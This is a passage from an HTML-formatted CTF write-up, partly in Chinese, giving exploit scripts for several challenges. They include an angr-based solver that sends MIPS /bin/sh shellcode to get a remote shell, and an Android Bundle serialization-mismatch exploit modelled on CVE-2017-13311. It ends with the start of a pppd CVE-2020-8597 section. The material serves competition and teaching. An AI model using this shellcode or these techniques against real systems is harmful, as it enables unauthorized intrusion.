class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                    <span class="keyword">if</span>(hashlib.sha256(chr(a)+chr(b)+chr(c)).hexdigest()==res):</span><br><span class="line">                        p.sendlineafter(<span class="string">"&gt;\n"</span>,chr(a)+chr(b)+chr(c))</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"???"</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">######################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">        ret=subprocess.Popen(<span class="string">"rm -rf ./1"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">        ret=subprocess.Popen(<span class="string">"rm -rf ./1.gz"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># start</span></span><br><span class="line">        p=remote(<span class="string">'106.53.114.216'</span>,<span class="number">9999</span>)</span><br><span class="line">        do_pow()</span><br><span class="line">        <span class="comment">#get binart</span></span><br><span class="line">        p.readuntil(<span class="string">"="</span>*<span class="number">15</span>+<span class="string">"\n"</span>)</span><br><span class="line">        data=p.readuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">        f=open(<span class="string">"./"</span>+str(<span class="number">1</span>)+<span class="string">".gz"</span>,<span class="string">"w+"</span>)</span><br><span class="line">        data=base64.b64decode(data)</span><br><span class="line">        f.write(data)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># get finished</span></span><br><span class="line">        ret=subprocess.Popen(<span class="string">"gunzip ./1.gz"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">        ret=subprocess.Popen(<span class="string">"chmod +x ./1"</span>.split(<span class="string">" "</span>))</span><br><span class="line">        ret.wait()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=process(<span class="string">"qemu-mipsel -L /usr/mipsel-linux-gnu/ ./1"</span>.split(<span class="string">" "</span>))</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span>):</span><br><span class="line">        func=analys()</span><br><span class="line">        payload=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> func:</span><br><span class="line">            <span class="keyword">if</span>(len(_)&gt;=<span class="number">109</span>*<span class="number">4</span>):<span class="comment"># certain</span></span><br><span class="line">                payload=type_1(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&lt;=<span class="number">49</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&gt;=<span class="number">47</span>*<span class="number">4</span>):<span class="comment"># s[0]:1/3 times</span></span><br><span class="line">                payload=type_2(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)==<span class="number">74</span>*<span class="number">4</span>):<span class="comment"># certain</span></span><br><span class="line">                payload=type_3(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&gt;=<span class="number">76</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&lt;=<span class="number">80</span>*<span class="number">4</span>):<span class="comment"># s[0]:1/3/5 times</span></span><br><span class="line">                payload=type_4(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&gt;=<span class="number">63</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&lt;=<span class="number">66</span>*<span class="number">4</span>): <span class="comment">#s[0] 1/4/3 times</span></span><br><span class="line">                payload=type_5(_)+payload</span><br><span class="line">            <span class="keyword">elif</span> (len(_)&gt;=<span class="number">42</span>*<span class="number">4</span> <span class="keyword">and</span> len(_)&lt;=<span class="number">44</span>*<span class="number">4</span>):</span><br><span class="line">                payload=type_6(_)+payload</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> len(_)/<span class="number">4</span></span><br><span class="line">                <span class="keyword">print</span> (_)</span><br><span class="line">                print(<span class="string">"Ouch! An erron was detected!"</span>)</span><br><span class="line">        get_flag(payload)</span><br><span class="line">      </span><br><span class="line">    ret=subprocess.Popen(<span class="string">"rm -rf ./1*"</span>.split(<span class="string">" "</span>))</span><br><span class="line">    ret.wait()</span><br></pre></td></tr></table></figure></p>
<h4><span id="angr">Angr</span></h4>
<p>I expected that it could be solved within two seconds, however, I found that it could not succeed in about 1.3 seconds during the game. This mythod which takes 1.5s is a little slower but I think this one is better.（abs checker needs z3） Exploit comes from MozhuCY@Nu1L and Mr.R@Nu1L .</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">'angr'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line">logging.getLogger(<span class="string">'angr.analyses'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line">logging.getLogger(<span class="string">'pwnlib.asm'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line">logging.getLogger(<span class="string">'angr.analyses.disassembly_utils'</span>).setLevel(<span class="string">'ERROR'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"ERROR"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">(hash)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                tmp = chr(i)+chr(j)+chr(k)</span><br><span class="line">                <span class="keyword">if</span> hash == hashlib.sha256(tmp).hexdigest():</span><br><span class="line">                    <span class="keyword">print</span> tmp</span><br><span class="line">                    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment">#21190da8c2a736569d9448d950422a7a a1 &lt; a2</span></span><br><span class="line"><span class="comment">#2a1fae6743ccdf0fcaf6f7af99e89f80 a2 &lt;= a1</span></span><br><span class="line"><span class="comment">#8342e17221ff79ac5fdf46e63c25d99b a1 &lt; a2</span></span><br><span class="line"><span class="comment">#51882b30d7af486bd0ab1ca844939644 a2 &lt;= a1</span></span><br><span class="line">tb = &#123;</span><br><span class="line">    <span class="string">"6aa134183aee6a219bd5530c5bcdedd7"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\xed\xd1\xda\x33"</span>,</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x87\x6e\x45\x82"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">'\xb7\x13\xdf\x8d'</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">'\x2f\x0f\x2c\x02'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"745482f077c4bfffb29af97a1f3bd00a"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x57\xcf\x81\xe7"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\x80\xbb\xdf\xb1"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x95\x3e\xf7\x4e"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\x1a\xc3\x00\x92"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"610a69b424ab08ba6b1b2a1d3af58a4a"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\xfb\xef\x2b\x2f"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\x10\xbd\x00\xac"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">'\xbd\x7a\x55\xd3'</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">'\xbc\xbb\xff\x4a'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b93e4feb8889770d981ef5c24d82b6cc"</span>:&#123;</span><br><span class="line">        <span class="string">'21190da8c2a736569d9448d950422a7a'</span>:&#123;</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">"\x2f\xfb\xef\x2b"</span>,</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">"\xac\x10\xbd\x00"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">'2a1fae6743ccdf0fcaf6f7af99e89f80'</span>:&#123;</span><br><span class="line">            <span class="string">'8342e17221ff79ac5fdf46e63c25d99b'</span>:<span class="string">'\x4a\xbc\xbb\xff'</span>,</span><br><span class="line">            <span class="string">'51882b30d7af486bd0ab1ca844939644'</span>:<span class="string">'\xd3\xbd\x7a\x55'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># hd = [i.start()for i in re.finditer("e0ffbd27".decode("hex"),f)]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findhd</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        code = f[addr:addr + <span class="number">4</span>]</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="string">"e0ffbd27"</span>.decode(<span class="string">"hex"</span>)):</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        addr -= <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dejmp</span><span class="params">(code)</span>:</span></span><br><span class="line">    c = <span class="string">""</span></span><br><span class="line">    d = Cs(CS_ARCH_MIPS,CS_MODE_MIPS32)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d.disasm(code,<span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"b"</span> <span class="keyword">in</span> i.mnemonic <span class="keyword">or</span> <span class="string">"j"</span> <span class="keyword">in</span> i.mnemonic):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">        <span class="comment">#print("0x%x:\t%s\t%s"%(i.address,i.mnemonic,i.op_str))</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">            c += code[i.address:i.address+<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># @func_set_timeout(1)</span></span><br><span class="line"><span class="comment"># @timeout_decorator.timeout(1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(func_addr,find,avoid)</span>:</span></span><br><span class="line">    <span class="comment"># p = angr.Project(filename,auto_load_libs = False)</span></span><br><span class="line">    start_address = func_addr</span><br><span class="line">    state = p.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    tmp_addr = <span class="number">0x20000</span></span><br><span class="line"></span><br><span class="line">    ans = claripy.BVS(<span class="string">'ans'</span>, <span class="number">4</span> * <span class="number">8</span>)</span><br><span class="line">    state.memory.store(tmp_addr, ans)</span><br><span class="line">    state.regs.a0 = <span class="number">0x20000</span></span><br><span class="line"></span><br><span class="line">    sm = p.factory.simgr(state)</span><br><span class="line">    sm.explore(find=find,avoid=avoid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state = sm.found[<span class="number">0</span>]</span><br><span class="line">        solution = solution_state.se.eval(ans)<span class="comment">#,cast_to=str)</span></span><br><span class="line">        <span class="comment"># print(hex(solution))</span></span><br><span class="line">        <span class="keyword">return</span> p32(solution)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Calc</span><span class="params">(func_addr,find,avoid)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tmp1 = hashlib.md5(dejmp(f[avoid - <span class="number">0x80</span>:avoid])).hexdigest()</span><br><span class="line">        tmp2 = hashlib.md5(f[avoid<span class="number">-0xdc</span>:avoid<span class="number">-0xdc</span>+<span class="number">4</span>]).hexdigest()</span><br><span class="line">        tmp3 = hashlib.md5((f[avoid - <span class="number">0x24</span>:avoid<span class="number">-0x20</span>])).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> tb[tmp1][tmp2][tmp3]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ret = calc(func_addr + base,find + base,avoid + base)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%s %s %s %x"</span>%(tmp1,tmp2,tmp3,func_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calc(0x401b34,0x401978,0x401c48)</span></span><br><span class="line"><span class="comment"># calc(0x401978,0x401b08,0x401b18)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__=="__main__":</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">"rm out.gz"</span>)</span><br><span class="line">        os.system(<span class="string">"rm out"</span>)</span><br><span class="line">        r = remote(<span class="string">"106.53.114.216"</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        r.recvline()</span><br><span class="line">        sha = r.recvline()</span><br><span class="line">        sha = sha.split(<span class="string">"\""</span>)[<span class="number">1</span>]</span><br><span class="line">        s = pow(sha)</span><br><span class="line">        r.sendline(s)</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">"pass pow"</span>)</span><br><span class="line">        r.recvuntil(<span class="string">"===============\n"</span>)</span><br><span class="line">        dump = r.recvline()</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">"write gz"</span>)</span><br><span class="line"></span><br><span class="line">        o = open(<span class="string">"out.gz"</span>,<span class="string">"wb"</span>)</span><br><span class="line">        o.write(dump.decode(<span class="string">"base64"</span>))</span><br><span class="line">        o.close()</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">"gunzip"</span>)</span><br><span class="line">        os.system(<span class="string">"gzip -d out.gz"</span>)</span><br><span class="line">        os.system(<span class="string">"chmod 777 out"</span>)</span><br><span class="line">        <span class="comment"># r = remote("127.0.0.1",8088)</span></span><br><span class="line">        log.success(<span class="string">"angr"</span>)</span><br><span class="line">        <span class="comment"># filename = "./1294672722"</span></span><br><span class="line">        filename = <span class="string">"out"</span></span><br><span class="line">        base = <span class="number">0x400000</span></span><br><span class="line">        p = angr.Project(filename,auto_load_libs = <span class="keyword">False</span>)</span><br><span class="line">        f = open(filename,<span class="string">"rb"</span>).read()</span><br><span class="line">        final = <span class="number">0xb30</span></span><br><span class="line"></span><br><span class="line">        vd = [i.start()<span class="keyword">for</span> i <span class="keyword">in</span> re.finditer(<span class="string">"25100000"</span>.decode(<span class="string">"hex"</span>),f)]</span><br><span class="line">        vd = vd[::<span class="number">-1</span>]</span><br><span class="line">        chk = <span class="string">""</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(vd) - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span>(vd[i] &lt;= <span class="number">0x2000</span>):</span><br><span class="line">                n += <span class="number">1</span></span><br><span class="line">                func = findhd(vd[i])</span><br><span class="line">                find = findhd(vd[i + <span class="number">1</span>])</span><br><span class="line">                avoid = vd[i]</span><br><span class="line">                ret = Calc(func,find,avoid)</span><br><span class="line">                <span class="comment"># print ret</span></span><br><span class="line">                chk += ret</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">        func = findhd(vd[len(vd) - <span class="number">1</span>])</span><br><span class="line">        find = final</span><br><span class="line">        avoid = vd[len(vd) - <span class="number">1</span>]</span><br><span class="line">        ret = Calc(func,find,avoid)</span><br><span class="line">        <span class="comment"># print ret</span></span><br><span class="line">        chk += ret</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> chk.encode(<span class="string">"hex"</span>)</span><br><span class="line">        <span class="comment"># chk = 'f1223fb171a0e700f3447552d3bd7a55a1f0a2f300809c0046e5fd5ed12c9696000000be961a961a00a420e60cf4f00800060000e54961e3a366c9acd3bd7a55'</span></span><br><span class="line">        <span class="comment"># chk = chk.decode('hex')</span></span><br><span class="line">        r.recvuntil(<span class="string">"Faster"</span>)</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,chk)</span><br><span class="line">        context.arch = <span class="string">'mips'</span></span><br><span class="line">        success(r.recvuntil(<span class="string">"Name"</span>))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,<span class="string">"g"</span>*<span class="number">8</span>)</span><br><span class="line">        ret_addr = vd[<span class="number">1</span>]<span class="number">-0x34</span><span class="number">-0x240</span>+base</span><br><span class="line">        success(hex(ret_addr))</span><br><span class="line">        shellcode = <span class="string">'la $v1,&#123;&#125;;'</span>.format(hex(ret_addr))</span><br><span class="line">        shellcode += <span class="string">'jr $v1;'</span></span><br><span class="line">        shellcode = asm(shellcode)</span><br><span class="line">        print(shellcode.encode(<span class="string">'hex'</span>))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,shellcode)</span><br><span class="line">        r.sendafter(<span class="string">"Faster &gt; "</span>,chk)</span><br><span class="line">        success(r.recvuntil(<span class="string">"Name"</span>))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,<span class="string">"gg"</span>)</span><br><span class="line">        shellcode = <span class="string">''</span></span><br><span class="line">        shellcode += <span class="string">"\xff\xff\x06\x28"</span></span><br><span class="line">        shellcode += <span class="string">"\xff\xff\xd0\x04"</span></span><br><span class="line">        shellcode += <span class="string">"\xff\xff\x05\x28"</span></span><br><span class="line">        shellcode += <span class="string">"\x01\x10\xe4\x27"</span></span><br><span class="line">        shellcode += <span class="string">"\x0f\xf0\x84\x24"</span></span><br><span class="line">        shellcode += <span class="string">"\xab\x0f\x02\x24"</span></span><br><span class="line">        shellcode += <span class="string">"\x0c\x01\x01\x01"</span></span><br><span class="line">        shellcode += <span class="string">"/bin/sh"</span></span><br><span class="line">        print(len(shellcode))</span><br><span class="line">        r.sendafter(<span class="string">"&gt;"</span>,shellcode)</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure>
<h2><span id="broadcasttest">BroadCastTest</span></h2>
<p>这道题是一道android pwn 主要的漏洞点是关于序列化与反序列化不匹配的漏洞 这道题主要是由CVE-2017-13311等启发而成</p>
<p>可以阅读https://xz.aliyun.com/t/2364这篇文章，里面详细的说明了类似漏洞的原理</p>
<p>在apk中，首先读取了Base64字符串，base64deocdeo之后将其作为一个Bundle放到广播中，发送给Receiver2 Receiver2接收到广播，取出Bundle，再从Bundle里面取出key为command的值，判断是否为getflag，不是的话就可以继续广播到Receiver3 Receiver3接收到广播，取出Bundle，判断command是否为getflag，是的话就输出Congratulation</p>
<p>正常途径是不能绕过这个判断的，但是在apk中存在一个com.de1ta.broadcasttest.MainActivity$Message类，里面的序列化和反序列化是不匹配的</p>
<p>在Receiver2中判断会command是否为flag会导致Bundle进行反序列化，之后发送给Receiver3的时候会进行序列化，最后Receiver3接收到Bundle后会进行最后一次反序列化</p>
<p>利用漏洞，可以在Receiver2中反序列化的时候获取不到key为command的string，在序列化之后就出现了key为command，值为getflag的string，然后Receiver3的check就能通过，最终获取到flag</p>
<p>下面是exp <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">from hashlib import sha256</span><br><span class="line">import itertools</span><br><span class="line">import string</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def proof_of_work(chal):</span><br><span class="line">    #for i in itertools.permutations(string.ascii_letters+string.digits, 4):</span><br><span class="line">    for i in itertools.permutations([chr(i) for i in range(256)], 4):</span><br><span class="line">        sol = &apos;&apos;.join(i)</span><br><span class="line">        if sha256(chal + sol).digest().startswith(&apos;\0\0\0&apos;):</span><br><span class="line">            return sol</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = &apos;SAEAAEJOREwDAAAACAAAAG0AaQBzAG0AYQB0AGMAaAAAAAAABAAAACwAAABjAG8AbQAuAGQAZQAxAHQAYQAuAGIAcgBvAGEAZABjAGEAcwB0AHQAZQBzAHQALgBNAGEAaQBuAEEAYwB0AGkAdgBpAHQAeQAkAE0AZQBzAHMAYQBnAGUAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAwAAAA0AAAA0AAAADQAAAAAAAAAHAAAAYwBvAG0AbQBhAG4AZAAAAAAAAAAHAAAAZwBlAHQAZgBsAGEAZwAAAAcAAABjAG8AbQBtAGEAbgBkAAAAAAAAAA0AAABQAGEAZABkAGkAbgBnAC0AVgBhAGwAdQBlAAAA&apos;</span><br><span class="line">b = base64.b64decode(a)</span><br><span class="line">p = remote(&apos;206.189.186.98&apos;, 8848)</span><br><span class="line">p.recvuntil(&apos;chal= &apos;)</span><br><span class="line">chal = p.recvuntil(&apos;\n&apos;)[:-1]</span><br><span class="line">p.recvuntil(&apos;&gt;&gt;\n&apos;)</span><br><span class="line">sol = proof_of_work(chal)</span><br><span class="line">p.send(sol)</span><br><span class="line">p.recvuntil(&apos;size&apos;)</span><br><span class="line">p.sendline(str(len(b)))</span><br><span class="line">p.recvuntil(&apos;please input payload:&apos;)</span><br><span class="line">p.send(b)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2><span id="pppd">pppd</span></h2>
<p>这道题是要求写CVE-2020-8597的1 day exp 这个cve本身其实是非常简单的，就单纯一个栈溢出 但是难的是与pppd进行通信和在mips环境下面进行调试</p>
<p>在比赛的时候大部分队伍都没有找到与pppd通信的办法，因此我就直接放出提示，使用socat与pppd进行通信</p>
